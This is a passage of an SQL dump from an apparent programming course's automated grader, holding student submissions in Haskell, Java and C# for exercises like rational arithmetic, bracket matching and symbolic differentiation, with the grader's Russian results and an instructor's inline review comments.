(Rat c d) = Rat (a*c) (b*d)\r\n	negate (Rat a b) = Rat (-a) b\r\n	abs (Rat a b) = Rat (abs a) (abs b)\r\n	signum (Rat a b) = Rat (signum a) (signum b)\r\n	fromInteger i = Rat 1 1\r\n', '<br/>Тесты успешно пройдены!'),
(3496, 97, 'hasp', '2012-11-13 22:20:31', 1, '	\r\npop (x:xs) = (x,xs)\r\npush e st = e:st\r\ntop (x:xs) = x \r\n\r\ncheckBracketsI [] st = null st\r\ncheckBracketsI (x:xs) st = case x of {''['' -> checkBracketsI xs (push x st); ''('' -> checkBracketsI xs (push x st); \r\n									  '']'' -> let (hd, ns) = pop st in if null st || hd /= ''['' then False else checkBracketsI xs ns;\r\n									  '')'' -> let (hd, ns) = pop st in if null st || hd /= ''('' then False else checkBracketsI xs ns;}\r\n									  \r\ncheckBrackets l = checkBracketsI l []		', '<br/>Тесты успешно пройдены!');
INSERT INTO `solution` (`SolutionID`, `TaskID`, `UserID`, `LoadTimestamp`, `ResultID`, `Code`, `TestResult`) VALUES
(3497, 99, '2562137', '2012-11-13 23:27:11', 1, 'abstract class Expr {\r\n\r\n	abstract Expr diff();\r\n\r\n	abstract String print();\r\n  --- Это, видимо, не обязательно определать, в любом опьекте ведь уже есть метод ToString(),\r\n  --- который можно переопределить.\r\n}\r\n\r\n\r\nclass NExpr extends Expr {\r\n\r\n	private int v;\r\n\r\n	NExpr(int v) {\r\n\r\n		this.v = v;\r\n\r\n	}\r\n\r\n	Expr diff() {\r\n\r\n		return new NExpr(0);\r\n\r\n	}\r\n\r\n	String print() {\r\n\r\n		return "" + v;\r\n\r\n	}\r\n\r\n}\r\n\r\n\r\n\r\nclass XExpr extends Expr {\r\n\r\n	XExpr() {}\r\n\r\n	Expr diff() {\r\n\r\n		return new NExpr(1);\r\n\r\n	}\r\n\r\n	String print() {\r\n\r\n		return "x";\r\n\r\n	}\r\n\r\n}\r\n\r\n\r\n\r\nclass AddExpr extends Expr {\r\n\r\n	private Expr e1, e2;\r\n\r\n	AddExpr(Expr e1, Expr e2) {\r\n\r\n		this.e1 = e1;\r\n\r\n		this.e2 = e2;\r\n\r\n	}\r\n\r\n	Expr diff() {\r\n\r\n		return new AddExpr(e1.diff(), e2.diff());\r\n\r\n	}\r\n\r\n	String print() {\r\n\r\n		return "(" + e1.print() + ") + (" + e2.print() + ")";\r\n\r\n	}\r\n\r\n}\r\n\r\n\r\n\r\nclass MultExpr extends Expr {\r\n\r\n	private Expr e1, e2;\r\n\r\n	MultExpr(Expr e1, Expr e2) {\r\n\r\n		this.e1 = e1;\r\n\r\n		this.e2 = e2;\r\n\r\n	}\r\n\r\n	Expr diff() {\r\n\r\n		return new AddExpr(new MultExpr(e1.diff(), e2), new MultExpr(e1, e2.diff()));\r\n\r\n	}\r\n\r\n	String print() {\r\n\r\n		return "(" + e1.print() + ") * (" + e2.print() + ")";\r\n\r\n	}\r\n\r\n}\r\n\r\n\r\n\r\npublic class Problem_26_1 {\r\n\r\n	public static void main(String args[]) {\r\n\r\n		Expr e = new MultExpr(new XExpr(), new XExpr());\r\n\r\n		System.out.println(e.diff().print());\r\n\r\n	}\r\n\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(3498, 85, '397095', '2012-11-14 06:49:58', 1, 'data Ration = Rat Integer Integer\r\n\r\ninstance Eq Ration where\r\n	(==) (Rat x y) (Rat a b) = x * b == y * a\r\n   --- Просто как замечание, тут всюду модно писать в инфиксной форме:\r\n   ---  (Rat x y) == (Rat a b) = и т.д.\r\n\r\ninstance Show Ration where\r\n	show (Rat x y) = (show x) ++ "/" ++ (show y)\r\n\r\ninstance Num Ration where\r\n	(+) (Rat x y) (Rat a b) = Rat (x * b + y * a) (y * b)\r\n\r\ninstance Ord Ration where\r\n	(<) (Rat x y) (Rat a b) = (x * b - y * a) * y * b < 0', '<br/>Тесты успешно пройдены!'),
(3499, 87, '397095', '2012-11-14 06:53:16', 1, 'data Expr = N Integer | Add Expr Expr | Mult Expr Expr | X\r\n\r\neval (N n) _ = n\r\neval (Add e1 e2) v = (eval e1 v) + (eval e2 v)\r\neval (Mult e1 e2) v = (eval e1 v) * (eval e2 v)\r\neval X v = v', '<br/>Тесты успешно пройдены!'),
(3500, 88, '397095', '2012-11-14 06:57:30', 1, 'data Expr = N Integer | Add Expr Expr | Mult Expr Expr | X deriving Show\r\n\r\ndiff (N _) = N 0\r\ndiff X = N 1\r\ndiff (Add e1 e2) = Add (diff e1) (diff e2)\r\ndiff (Mult e1 e2) = Add (Mult (diff e1) e2) (Mult e1 (diff e2))', '<br/>Тесты успешно пройдены!'),
(3501, 91, '397095', '2012-11-14 07:00:39', 2, '  --- Нет, не совсем так.. Например merge [1,2] [3,4] дает у вас неправильный результат. \r\n  --- Исправьте, пожалуйста, это просто. А я сейчас добавлю такой тест\r\nmerge [] xs = xs\r\nmerge xs [] = xs\r\nmerge (x:xs) (y:ys) = \r\n	let \r\n		a = min x y\r\n		b = max x y\r\n	in\r\n		if (x == y) then\r\n			(x : merge xs ys)\r\n		else\r\n			(a : b : merge xs ys)', '<br/>Тесты успешно пройдены!'),
(3502, 89, '397095', '2012-11-14 07:05:08', 1, 'data Tree = Node Integer Tree Tree | Empty\r\n\r\nflatten t = f t []\r\n\r\nf Empty xs = xs\r\nf (Node v tl tr) xs = v : (f tl (f tr xs))', '<br/>Тесты успешно пройдены!'),
(3503, 86, '397095', '2012-11-14 07:10:29', 1, 'allNondivisible xs = f xs (	 -> True)\r\n\r\nf [x] cond = cond x\r\nf (x:xs) cond = if not (cond x) then False else f xs (	 -> cond t && (mod x t /= 0) && (mod t x /= 0))', '<br/>Тесты успешно пройдены!'),
(3504, 90, '397095', '2012-11-14 09:08:08', 1, 'data Answer = Answer Integer | None deriving Show\r\n\r\nfindSame xs = f xs (	 -> False)\r\n\r\nf [] cond = None\r\nf (x:xs) cond = if cond x then Answer x else f xs (	 -> cond t || x == t)', '<br/>Тесты успешно пройдены!'),
(3505, 98, 'tonyo', '2012-11-14 09:16:07', 1, '-- действительно, была обидная опечатка..\r\n\r\ndata Tree = Empty | Node Char Tree Tree\r\n  deriving Show\r\n                                          \r\ntoStr Empty = "*"\r\ntoStr (Node ch lc rc) = "(" ++  (ch:[]) ++ " " ++ toStr lc ++ " " ++ toStr rc ++ ")"\r\n\r\nfromStr (''*'': str) = Empty\r\nfromStr (''('' : ch : '' '': str)  = Node ch (fromStr str) (fromStr str2)\r\n  where str2 = getRightChild str \r\n\r\ngetRightChild (''*'':xs) = tail xs\r\ngetRightChild (''('':xs) = getRightChild1 xs 0\r\n\r\ngetRightChild1 (x:xs) val\r\n  | x == '')'' && val == 0 = tail xs\r\n  | x == ''('' = getRightChild1 xs (val-1)\r\n  | x == '')'' = getRightChild1 xs (val+1)\r\n  | otherwise = getRightChild1 xs val\r\n', '<br/>Тесты успешно пройдены!'),
(3506, 99, '787463', '2012-11-14 12:16:07', 1, 'using System;\r\n\r\n\r\n\r\nnamespace task_26_1\r\n\r\n{\r\n\r\n	abstract class Node\r\n\r\n	{\r\n\r\n		abstract override public string ToString();\r\n    --- Это писать совсем необязательно. ToString и так определена во всех обьектах.\r\n    --- Как вариант, я бы лично определил тут абстракную функцию Ваа и переопределил ее для всез типо выражения.\r\n    --- А то в вашем варианте при добавдении ногво типа вырадени янадо обязательно не забыть дописать\r\n    --- код в Diff и это получется не очень хорошо (примерно это называется\r\n    --- Liskov Subsituion Principle).\r\n\r\n	}\r\n\r\n	\r\n\r\n	class Variable : Node\r\n\r\n	{\r\n\r\n		override public string ToString()\r\n\r\n		{\r\n\r\n			return "X";\r\n\r\n		}\r\n\r\n	}\r\n\r\n	\r\n\r\n	class Number : Node\r\n\r\n	{\r\n\r\n		private int val;\r\n\r\n		\r\n\r\n		public Number(int n)\r\n\r\n		{\r\n\r\n			this.val = n;\r\n\r\n		}\r\n\r\n		\r\n\r\n		override public string ToString()\r\n\r\n		{\r\n\r\n			return "N " + val;\r\n\r\n		}\r\n\r\n	}\r\n\r\n	\r\n\r\n	class BinOp : Node\r\n\r\n	{\r\n\r\n		public Node left;\r\n\r\n		public Node right;\r\n\r\n		private string op;\r\n\r\n		\r\n\r\n		public BinOp(Node l, Node r, string operation)\r\n\r\n		{\r\n\r\n			this.left = l;\r\n\r\n			this.right = r;\r\n\r\n			this.op = operation;\r\n\r\n		}\r\n\r\n		\r\n\r\n		override public string ToString()\r\n\r\n		{\r\n\r\n			return op + " (" + left.ToString() + ") (" + right.ToString() + ")";\r\n\r\n		}\r\n\r\n	}\r\n\r\n	\r\n\r\n	class Add : BinOp\r\n\r\n	{\r\n\r\n		public Add(Node l, Node r) : base(l, r, "Add") {}\r\n\r\n	}\r\n\r\n	\r\n\r\n	class Mult : BinOp\r\n\r\n	{\r\n\r\n		public Mult(Node l, Node r) : base(l, r, "Mult") {}\r\n\r\n	}\r\n\r\n	\r\n\r\n	class Task\r\n\r\n	{\r\n\r\n		public static Node Diff(Node n)\r\n\r\n		{\r\n\r\n			if (n is Number)\r\n\r\n			{\r\n\r\n				return new Number(0);\r\n\r\n			} else if (n is Variable)\r\n\r\n			{\r\n\r\n				return new Number(1);\r\n\r\n			} else if (n is Add)\r\n\r\n			{\r\n\r\n				Add m = (Add) n;\r\n\r\n				return new Add(Diff(m.left), Diff(m.right));\r\n\r\n			} else\r\n\r\n			{\r\n\r\n				Mult m = (Mult) n;\r\n\r\n				return new Add(new Mult(Diff(m.left), m.right), new Mult(m.left, Diff(m.right)));\r\n\r\n			}\r\n\r\n		}\r\n\r\n		\r\n\r\n		public static void Main (string[] args)\r\n\r\n		{\r\n\r\n			Node v = new Variable();\r\n\r\n			Node n = new Number(5);\r\n\r\n			Node x = new Mult(new Variable(), new Variable());\r\n\r\n			\r\n\r\n			Console.WriteLine(Diff(v).ToString());\r\n\r\n			Console.WriteLine(Diff(n).ToString());\r\n\r\n			Console.WriteLine(Diff(x).ToString());\r\n\r\n		}\r\n\r\n	}\r\n\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(3507, 97, '3607492', '2012-11-14 12:40:55', 1, 'check [] [] = True\r\ncheck [] _ = False\r\ncheck (x:xs) [] = if (x /= ''('' && x /= ''['') then False else check xs [x]\r\n\r\ncheck (x:xs) (z:zs) = if (x /= '']'' && x /= '')'') \r\n						then check xs (x:z:zs) \r\n						else if ((x == '']'' && z == ''['') || (x == '')'' && z == ''('') ) then check xs zs else False\r\n\r\ncheckBrackets x = check x []', '<br/>Тесты успешно пройдены!'),
(3508, 98, '3607492', '2012-11-14 13:16:45', 1, 'import Text.Show.Functions\r\n\r\ndata Tree = Node Char Tree Tree | Empty  deriving Show\r\n\r\ngetBranch x y 0 = (x,reverse y)\r\ngetBranch [] y _ = ("_","_")\r\ngetBranch (x:xs) y z = if (x == ''('') \r\n						then getBranch xs (x:y) (if (z==(-1)) then 1 else (z+1)) \r\n						else \r\n							if (x == '')'')\r\n							 then\r\n							 	 if (z<=0) then getBranch [] [] z \r\n							 				else getBranch xs (x:y) (z-1) \r\n							 else getBranch xs (x:y) z \r\n\r\n\r\n\r\nfindBranches x = (fromStr z, fromStr f) \r\n				where\r\n					(y,f) = getBranch t [] (-1) \r\n					(t,z) = getBranch x [] (-1)\r\n\r\nfromStr [] = Empty\r\nfromStr (x:xs) = if (x==''a'' || x == ''b'') then Node x l r else if (x == ''_'') then Empty else fromStr xs\r\n			where\r\n				(l,r) = findBranches xs\r\n\r\n\r\ntoStr Empty = "_"\r\ntoStr (Node a b c) = [a] ++" (" ++ (toStr b) ++") (" ++(toStr c) ++ ") "', '<br/>Тесты успешно пройдены!'),
(3509, 91, '383483', '2012-11-14 13:39:00', 1, 'merge [] ys = ys\r\nmerge xs [] = xs\r\nmerge (x:xs) (y:ys) \r\n	| x==y = x:(merge xs ys)\r\n	| x<y = x:(merge xs (y:ys))\r\n	| otherwise = y:(merge (x:xs) ys)', '<br/>Тесты успешно пройдены!'),
(3510, 85, '3607492', '2012-11-14 14:16:17', 0, 'data Rat = Rat {x :: Int, y :: Int}\r\n\r\ninstance Eq Rat where\r\n	(Rat a b) == (Rat x y) = (a*y == b*x)\r\n\r\ninstance Ord Rat where\r\n	(Rat a b) > (Rat x y) = (a*y > b*x)\r\n	(Rat a b) < (Rat x y) = (a*y < b*x)\r\n\r\ninstance Num Rat where\r\n	(Rat a b) + (Rat x y)  = (Rat (div r g) (div p g))\r\n								where\r\n									r = a*y+b*x\r\n									p = b*y\r\n									g = gcd r p \r\n	(Rat a b) * (Rat x y) = (Rat (div r g) (div p g))\r\n								where\r\n									r = a*x\r\n									p = b*y\r\n									g = gcd r p \r\n\r\n\r\ninstance Show Rat where\r\n	show (Rat a 1) = show a\r\n	show (Rat a b) = show a ++ "\\" ++ show b', 'Выражение имеет неправильное значение: Rat 1 2 + Rat 1 7'),
(3511, 85, '3607492', '2012-11-14 14:17:14', 0, 'data Rat = Rat {x :: Int, y :: Int}\r\n\r\ninstance Eq Rat where\r\n	(Rat a b) == (Rat x y) = (a*y == b*x)\r\n\r\ninstance Ord Rat where\r\n	(Rat a b) > (Rat x y) = (a*y > b*x)\r\n	(Rat a b) < (Rat x y) = (a*y < b*x)\r\n\r\ninstance Num Rat where\r\n	(Rat a b) + (Rat x y)  = (Rat (div r g) (div p g))\r\n								where\r\n									r = a*y+b*x\r\n									p = b*y\r\n									g = gcd r p \r\n	(Rat a b) * (Rat x y) = (Rat (div r g) (div p g))\r\n								where\r\n									r = a*x\r\n									p = b*y\r\n									g = gcd r p \r\n\r\n\r\ninstance Show Rat where\r\n	show (Rat a 1) = show a\r\n	show (Rat a b) = show a ++ "/" ++ show b', 'Хитрый тест номер 2 не пройден :(<br/>Подсказка: Числа ведь могут быть и отрицательными...'),
(3512, 85, '3607492', '2012-11-14 14:37:03', 1, 'data Rat = Rat {x :: Int, y :: Int}\r\n\r\ninstance Eq Rat where\r\n	(Rat a b) == (Rat x y) = (a*y == b*x)\r\n\r\ninstance Ord Rat where\r\n	(Rat a b) > (Rat x y) = (abs(a)*y1 > abs(x)*b1)\r\n								where \r\n									b1 = if (x*y<0)  then -(abs b) else (abs b)\r\n									y1 = if (a*b<0)then -(abs y) else (abs y)\r\n	(Rat a b) < (Rat x y) = (abs(a)*y1 < abs(x)*b1)\r\n								where \r\n									b1 = if (x*y<0) then -(abs b) else (abs b)\r\n									y1 = if (a*b<0) then -(abs y) else (abs y)\r\n\r\ninstance Num Rat where\r\n	(Rat a b) + (Rat x y)  = (Rat (div r g) (div p g))\r\n								where\r\n									r = a*y+b*x\r\n									p = b*y\r\n									g = gcd r p \r\n	(Rat a b) * (Rat x y) = (Rat (div r g) (div p g))\r\n								where\r\n									r = a*x\r\n									p = b*y\r\n									g = gcd r p \r\n\r\n\r\ninstance Show Rat where\r\n	show (Rat a 1) = show a\r\n	show (Rat a b) = (if ( b<0 && a>0 || b>0 && a<0) then "-" else "") ++ show (abs a) ++ "/" ++ show (abs b)', '<br/>Тесты успешно пройдены!'),
(3513, 97, '1705225', '2012-11-14 15:05:54', 1, 'closingBracket c\r\n	|c == ''[''	= '']''\r\n	|c == ''(''	= '')''\r\n	|otherwise	= error "wrong character"\r\n	\r\n	\r\ncheckBrackets = checkBrackets'' []\r\n\r\ncheckBrackets'' expected [] = null expected\r\ncheckBrackets'' expected (x:xs)\r\n	|elem x "[("							= checkBrackets'' (closingBracket x : expected) xs\r\n	|elem x "])" && (not $ null expected)	= x == (head expected) && checkBrackets'' (tail expected) xs\r\n	|otherwise								= False', '<br/>Тесты успешно пройдены!'),
(3514, 85, '4837959', '2012-11-14 15:08:20', 0, 'data Ration = Rat Integer Integer\r\n\r\ninstance Show Ration where\r\n    show (Rat a b) = show a ++ "/" ++ show b\r\ninstance Num Ration where\r\n    (Rat a1 b1) + (Rat a2 b2) = Rat (a1 * b2 + a2 * b1) (b1 * b2)\r\ninstance Eq Ration where\r\n    Rat a1 b1 == Rat a2 b2 = a1 * b2 == a2 * b1\r\ninstance Ord Ration where\r\n    compare (Rat a1 b1) (Rat a2 b2) = compare (a1 * b2) (a2 * b1)', 'Хитрый тест номер 2 не пройден :(<br/>Подсказка: Числа ведь могут быть и отрицательными...'),
(3515, 85, '4837959', '2012-11-14 15:15:16', 1, 'data Ration = Rat Integer Integer\r\n\r\ninstance Show Ration where\r\n    show (Rat a b) = show a ++ "/" ++ show b\r\ninstance Num Ration where\r\n    (Rat a1 b1) + (Rat a2 b2) = Rat (a1 * b2 + a2 * b1) (b1 * b2)\r\ninstance Eq Ration where\r\n    Rat a1 b1 == Rat a2 b2 = a1 * b2 == a2 * b1\r\ninstance Ord Ration where\r\n    compare (Rat a1 b1) (Rat a2 b2) = let\r\n                                          m1 = a1 * b1\r\n                                          m2 = a2 * b2\r\n                                          a1'' = m1 `div` abs b1\r\n                                          b1'' = abs m1 `div` abs a1\r\n                                          a2'' = m2 `div` abs b2\r\n                                          b2'' = abs m2 `div` abs a2\r\n                                      in compare (a1'' * b2'') (a2'' * b1'')', '<br/>Тесты успешно пройдены!'),
(3516, 91, '397095', '2012-11-14 15:28:28', 1, 'merge [] xs = xs\r\nmerge xs [] = xs\r\nmerge (x:xs) (y:ys)\r\n | x == y = (x : merge xs ys)\r\n | x < y = (x : merge xs (y:ys))\r\n | y < x = (y : merge (x:xs) ys)', '<br/>Тесты успешно пройдены!'),
(3517, 86, '4837959', '2012-11-14 15:29:36', 1, 'allNondivisible xs = allNondivisible'' xs (	 -> True)\r\nallNondivisible'' [] _ = True\r\nallNondivisible'' (x:xs) cond = if not (cond x)\r\n                               then False\r\n                               else allNondivisible'' xs (	 -> cond t && mod t x /= 0 && mod x t /= 0)', '<br/>Тесты успешно пройдены!'),
(3518, 87, '4837959', '2012-11-14 15:36:57', 1, 'data Expr = X | N Integer | Add Expr Expr | Mult Expr Expr deriving Show\r\n\r\neval X x = x\r\neval (N n) x = n\r\neval (Add e1 e2) x = eval e1 x + eval e2 x\r\neval (Mult e1 e2) x = eval e1 x * eval e2 x\r\n', '<br/>Тесты успешно пройдены!'),
(3519, 88, '4837959', '2012-11-14 15:41:28', 1, 'data Expr = X | N Integer | Add Expr Expr | Mult Expr Expr deriving Show\r\n\r\ndiff X = N 1\r\ndiff (N n) = N 0\r\ndiff (Add e1 e2) = Add (diff e1) (diff e2)\r\ndiff (Mult e1 e2) = Add (Mult (diff e1) e2) (Mult e1 (diff e2))\r\n', '<br/>Тесты успешно пройдены!'),
(3520, 98, '2118411', '2012-11-14 15:47:12', 1, 'data Tree = Empty | Node Char Tree Tree\r\n\r\n	deriving Show\r\n\r\n\r\n\r\ntoStr Empty = "*"\r\n\r\ntoStr (Node c l r) = c:"<"++(toStr l)++"|"++(toStr r)++">"\r\n\r\n\r\n\r\nfromStr (c:str)\r\n\r\n	| c == ''*'' = Empty\r\n\r\n	| otherwise = Node c l r\r\n\r\n	where\r\n\r\n		(ls,rs) = splitStr (tail (init str))\r\n\r\n		l = fromStr ls\r\n\r\n		r = fromStr rs\r\n\r\n\r\n\r\nsplitStr ("*|*") = ("*", "*")\r\n\r\nsplitStr str = (reverse l, r) where (l,r) = split2 str\r\n\r\nsplit2 str = split3 (tail (tail str)) ([''<'', head str]) 1\r\n\r\n\r\n\r\nsplit3 ("") lrs n\r\n\r\n	| n == 0 = (lrs,"")\r\n\r\n	| otherwise = error "Fail"\r\n\r\nsplit3 (c:str) lrs n\r\n\r\n	| n == 0 = (lrs, str)\r\n\r\n	| c == ''<'' = split3 str (c:lrs) (n+1)\r\n\r\n	| c == ''>'' = split3 str (c:lrs) (n-1)\r\n\r\n	| otherwise = split3 str (c:lrs) n\r\n', '<br/>Тесты успешно пройдены!'),
(3521, 89, '4837959', '2012-11-14 15:57:57', 1, 'data Tree = Empty | Node Integer Tree Tree\r\n\r\nflatten root = reverse $ flatten'' root []\r\nflatten'' Empty xs = xs\r\nflatten'' (Node v t1 t2) xs = flatten'' t2 (flatten'' t1 (v:xs))\r\n   --- Или проще было бы тут приписывать v слева а не справа, тогда бы и reverse не потребовался', '<br/>Тесты успешно пройдены!'),
(3522, 90, '4837959', '2012-11-14 16:07:20', 1, 'data NumOrNotFound = NotFound | N Integer\r\n\r\ninstance Show NumOrNotFound where\r\n    show NotFound = "NotFound"\r\n    show (N n) = show n\r\n\r\nfindSame [] = NotFound\r\nfindSame (x:xs) = if any (==x) xs\r\n                  then N x\r\n                  else findSame xs', '<br/>Тесты успешно пройдены!'),
(3523, 91, '4837959', '2012-11-14 16:13:35', 1, 'merge [] ys = ys\r\nmerge xs [] = xs\r\nmerge (x:xs) (y:ys)\r\n    | x == y = merge xs (y:ys)\r\n    | x < y = x:merge xs (y:ys)\r\n    | otherwise = y:merge (x:xs) ys\r\n', '<br/>Тесты успешно пройдены!'),
(3524, 87, '3607492', '2012-11-14 16:34:58', 0, 'data Eval = Add Eval Eval| Mult Eval Eval |Sub Eval Eval| Div Eval Eval | N Int | X\r\n\r\neval X t = t\r\neval (N a) t= a\r\neval (Add a b) t= eval a t + eval b t\r\neval (Sub a b) t= eval a t- eval b t\r\neval (Mult a b) t= eval a t * eval b t\r\neval (Div a b) t= div (eval a t) (eval b t)', '<br/>Тесты успешно пройдены!'),
(3525, 87, '3607492', '2012-11-14 16:35:37', 1, 'data Expr = Add Expr Expr| Mult Expr Expr |Sub Expr Expr| Div Expr Expr | N Int | X\r\n\r\neval X t = t\r\neval (N a) t= a\r\neval (Add a b) t= eval a t + eval b t\r\neval (Sub a b) t= eval a t- eval b t\r\neval (Mult a b) t= eval a t * eval b t\r\neval (Div a b) t= div (eval a t) (eval b t)', '<br/>Тесты успешно пройдены!'),
(3526, 85, '532002', '2012-11-14 16:39:11', 0, 'isosc (x1,y1) (x2,y2) (x3,y3) = let dist (x1,y1) (x2,y2) = sqrt(abs(x2-x1)^2+abs(y2-y1)^2)\r\n\n                                l1 = dist (x1,y1) (x2,y2)\r\n\n                                l2 = dist (x1,y1) (x3,y3)\r\n\n                                l3 = dist (x2,y2) (x3,y3) \r\n\n                                res = if ((l1==l2)||(l1==l3)||(l2==l3)) then True else False\r\n\n                                in res\n', 'Не удалось вычислить выражение "Rat 1 2 + Rat 1 7", проверьте правильность синтаксиса'),
(3527, 85, '532002', '2012-11-14 16:42:53', 0, 'data Ration = Rat Int Int \r\n\ninstance Num Ration where\r\n\n (Rat x1 y1)+(Rat x2 y2) = Rat (x1*y2 + x2*y1) (y1*y2)\r\n\ninstance Eq Ration where\r\n\n (Rat x1 y1) == (Rat x2 y2) = (x1*y2) == (x2*y1)\r\n\ninstance Show Ration where\r\n\n show (Rat x y) = show x ++ "/" ++ show y\r\n\ninstance Ord Ration where\r\n\n (Rat x1 y1)<(Rat x2 y2) = (x1*y2) < (x2*y1) \r\n\n\n', 'Хитрый тест номер 2 не пройден :(<br/>Подсказка: Числа ведь могут быть и отрицательными...'),
(3528, 88, '3607492', '2012-11-14 16:43:28', 0, 'data Expr = Add Expr Expr| Mult Expr Expr |Sub Expr Expr| Div Expr Expr | N Int | X deriving Show\r\n\r\n\r\ndiff X = N 1\r\ndiff (N _) = N 0\r\ndiff (Add a b) = Add (diff a) (diff b)\r\ndiff (Mult a b) = Add (Mult a (diff b)) (Mult (diff a) b)\r\ndiff (Sub a b) = Sub (diff a) (diff b)\r\ndiff (Div a b) = Div (Sub (Mult a (diff b)) (Mult (diff a) b)) (Mult b b)', 'Выражение имеет неправильное значение: diff (Mult X X)'),
(3529, 88, '3607492', '2012-11-14 16:44:46', 0, 'data Expr = Add Expr Expr| Mult Expr Expr |Sub Expr Expr| Div Expr Expr | N Int | X deriving Show\r\n\r\n\r\ndiff X = N 1\r\ndiff (N _) = N 0\r\ndiff (Add a b) = Add (diff a) (diff b)\r\ndiff (Mult a b) = Add (Mult (diff b) a) (Mult (diff a) b)\r\ndiff (Sub a b) = Sub (diff a) (diff b)\r\ndiff (Div a b) = Div (Sub (Mult a (diff b)) (Mult (diff a) b)) (Mult b b)', 'Выражение имеет неправильное значение: diff (Mult X X)'),
(3530, 91, '63706456', '2012-11-14 16:44:57', 1, 'merge (x:xs) (y:ys) | x > y = y:(merge (x:xs) ys)\r\n                    | x < y = x:(merge xs (y:ys))\r\n                    | otherwise = x:(merge xs ys)\r\nmerge x [] = x\r\nmerge [] x = x', '<br/>Тесты успешно пройдены!'),
(3531, 88, '3607492', '2012-11-14 16:46:10', 1, 'data Expr = Add Expr Expr| Mult Expr Expr |Sub Expr Expr| Div Expr Expr | N Int | X deriving Show\r\n\r\n\r\ndiff X = N 1\r\ndiff (N _) = N 0\r\ndiff (Add a b) = Add (diff a) (diff b)\r\ndiff (Mult a b) = Add (Mult (diff b) a) (Mult b (diff a))\r\ndiff (Sub a b) = Sub (diff a) (diff b)\r\ndiff (Div a b) = Div (Sub (Mult a (diff b)) (Mult (diff a) b)) (Mult b b)', '<br/>Тесты успешно пройдены!'),
(3532, 89, '63706456', '2012-11-14 16:50:21', 0, 'data Tree a = Node a (Tree a) (Tree a) | Empty deriving Show\r\n\r\nfoldTree f def (Node num left right) = 	f num (recCall left) (recCall right)\r\n					where recCall = foldTree f def\r\nfoldTree f def Empty = def\r\n\r\nheigth = foldTree (a b c -> 1 + max b c) (-1)\r\n\r\nfoldTree'' f = foldTree (x y z -> f y (f x z))\r\n\r\nflatten tree = (foldTree'' (:) id tree) []', 'Не удалось вычислить выражение "flatten (Node 1 (Node 2 Empty Empty) (Node 3 Empty Empty))", проверьте правильность синтаксиса'),
(3533, 86, '3607492', '2012-11-14 17:03:06', 1, '   --- Это не совсем то, что я имел в виду, но ОК, засчитано.\r\n   --- А как я имел в виду, мы завтра разберем. Мне кажется, у меня получается попроще.\r\nallNondivisible1::[Int]->(Int->Bool)->(Int->Bool)\r\nallNondivisible1 [] f = f\r\nallNondivisible1 (x:xs) f = allNondivisible1 xs (z->f z && mod z x /= 0 && mod x z /= 0)\r\n\r\nallNondivisible [] = True\r\nallNondivisible (x:xs) = (allNondivisible1 xs (	->True)) x && allNondivisible xs', '<br/>Тесты успешно пройдены!'),
(3534, 85, '532002', '2012-11-14 17:06:05', 1, 'data Ration = Rat Int Int \r\n\r\ninstance Num Ration where\r\n\r\n (Rat x1 y1)+(Rat x2 y2) = Rat (x1*y2 + x2*y1) (y1*y2)\r\n\r\ninstance Eq Ration where\r\n\r\n (Rat x1 y1) == (Rat x2 y2) = (x1*y2) == (x2*y1)\r\n\r\ninstance Show Ration where\r\n\r\n show (Rat x y) = show x ++ "/" ++ show y\r\n\r\ninstance Ord Ration where\r\n\r\n (Rat x1 y1)<(Rat x2 y2) =  if (signum y1 == signum y2 )then (x1*y2) < (x2*y1) else (x1*y2) > (x2*y1)\r\n', '<br/>Тесты успешно пройдены!'),
(3535, 99, '2118411', '2012-11-14 17:41:27', 1, '﻿using System;\r\n\r\n\r\n\r\nnamespace FPTask\r\n\r\n{\r\n\r\n    delegate double Func(double x);\r\n\r\n\r\n\r\n    class Program\r\n\r\n    {\r\n\r\n        static void Main(string[] args)\r\n\r\n        {\r\n\r\n            Expr expectedResult = new Expr("Add (Mult(N 1) X) (Mult X (N 1))");\r\n\r\n            Expr expr = new Expr("Mult X X");\r\n\r\n            Expr diffResult = expr.Diff();\r\n\r\n            Console.WriteLine(expectedResult);\r\n\r\n            Console.WriteLine(diffResult);\r\n\r\n        }\r\n\r\n\r\n\r\n    }\r\n\r\n\r\n\r\n    enum exprTypes { X, N, Add, Mult };\r\n\r\n\r\n\r\n    class Expr\r\n\r\n    {\r\n\r\n        exprTypes type;\r\n\r\n        int n;\r\n\r\n        Expr arg1, arg2;\r\n\r\n\r\n\r\n        #region Constructors\r\n\r\n        public Expr(exprTypes type)\r\n\r\n        {\r\n\r\n            if (type == exprTypes.X)\r\n\r\n            {\r\n\r\n                this.type = type;\r\n\r\n            }\r\n\r\n            else\r\n\r\n            {\r\n\r\n                throw new ArgumentException("Wrong type!");\r\n\r\n            }\r\n\r\n        }\r\n\r\n\r\n\r\n        public Expr(exprTypes type, int n)\r\n\r\n        {\r\n\r\n            if (type == exprTypes.N)\r\n\r\n            {\r\n\r\n                this.type = type;\r\n\r\n                this.n = n;\r\n\r\n            }\r\n\r\n            else\r\n\r\n            {\r\n\r\n                throw new ArgumentException("Wrong type!");\r\n\r\n            }\r\n\r\n        }\r\n\r\n\r\n\r\n        public Expr(exprTypes type, Expr arg1, Expr arg2)\r\n\r\n        {\r\n\r\n            if (type == exprTypes.Add || type == exprTypes.Mult)\r\n\r\n            {\r\n\r\n                this.type = type;\r\n\r\n                this.arg1 = arg1;\r\n\r\n                this.arg2 = arg2;\r\n\r\n            }\r\n\r\n            else\r\n\r\n            {\r\n\r\n                throw new ArgumentException("Wrong type!");\r\n\r\n            }\r\n\r\n        }\r\n\r\n\r\n\r\n        public Expr(string str)\r\n\r\n        {\r\n\r\n            str = str.Trim();\r\n\r\n            string str1, str2;\r\n\r\n\r\n\r\n            if (str.Length == 0)\r\n\r\n            {\r\n\r\n                throw new ArgumentException(str);\r\n\r\n            }\r\n\r\n            else\r\n\r\n            {\r\n\r\n                switch (str[0])\r\n\r\n                {\r\n\r\n                    case ''X'':\r\n\r\n                        type = exprTypes.X;\r\n\r\n                        if (str.Length != 1)\r\n\r\n                        {\r\n\r\n                            throw new ArgumentException(str);\r\n\r\n                        }\r\n\r\n                        break;\r\n\r\n                    case ''N'':\r\n\r\n                        type = exprTypes.N;\r\n\r\n                        if (!int.TryParse(str.Substring(1), out n))\r\n\r\n                        {\r\n\r\n                            throw new ArgumentException(str);\r\n\r\n                        }\r\n\r\n                        break;\r\n\r\n                    case ''A'':\r\n\r\n                        if (str[1] == ''d'' && str[2] == ''d'')\r\n\r\n                        {\r\n\r\n                            type = exprTypes.Add;\r\n\r\n          